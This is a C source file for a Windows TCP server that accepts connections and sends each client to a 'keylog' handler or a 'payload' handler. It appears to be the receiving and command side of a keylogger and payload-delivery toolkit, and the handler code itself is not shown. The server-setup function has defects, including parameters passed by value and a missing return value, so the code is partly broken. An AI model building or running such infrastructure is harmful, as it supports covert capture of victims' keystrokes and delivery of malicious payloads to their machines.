#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "servers/logging-server.h" 
#include "servers/payload-server.h" 
#include "core/server-core.h" 


BOOL initializeServer(SOCKET serverSocket, int socketResult, BOOL wsaInitialized, WSADATA wsaData, unsigned short port) {
    socketResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (socketResult != 0) {
        return FALSE;
    }
    wsaInitialized = TRUE;

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        return FALSE;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        return FALSE;
    }

    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        return FALSE;
    }
}

BOOL acceptClientsLoop(SOCKET serverSocket, SOCKET clientSocket, HANDLE thread, ThreadArgs* args, char mode[]) {
    while (1) {
        clientSocket = accept(serverSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            continue;
        }

        args = (ThreadArgs*)malloc(sizeof(ThreadArgs));
        if (!args) {
            return FALSE;
        }
        args->acceptSocket = clientSocket;

        LPTHREAD_START_ROUTINE threadFunction;

        if (strcmp(mode, "keylog") == 0) {
            threadFunction = (LPTHREAD_START_ROUTINE)handleLogging;
        } else if (strcmp(mode, "payload") == 0) {
            threadFunction = (LPTHREAD_START_ROUTINE)handlePayload;
        }

        thread = CreateThread(NULL, 0, threadFunction, args, 0, NULL);
        if (thread == NULL) {
            return FALSE;
        }
        
        WaitForSingleObject(thread, INFINITE);
    }

    return TRUE;
}
